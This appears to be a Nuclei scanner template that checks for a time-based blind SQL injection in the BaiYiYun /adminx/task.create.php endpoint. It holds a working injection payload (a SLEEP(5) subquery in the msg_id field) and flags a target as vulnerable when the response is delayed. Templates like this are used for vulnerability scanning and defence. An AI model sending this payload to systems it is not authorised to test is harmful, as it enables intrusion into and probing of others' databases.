id: BaiYiYun-task-create-php-sqlInjection
info:
  name: BaiYiYun-task-create-php-sqlInjection
  author: iSee857
  severity: high
  description: BaiYiYun-task-create-php-sqlInjection

requests:
  - method: POST
    raw:
      - |
        POST /adminx/task.create.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        msg_id=1%20OR%20(SELECT%201337%20FROM%20(SELECT(SLEEP(5)))xxxx)&org_id=

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "duration >= 5"

      - type: status
        status:
          - 200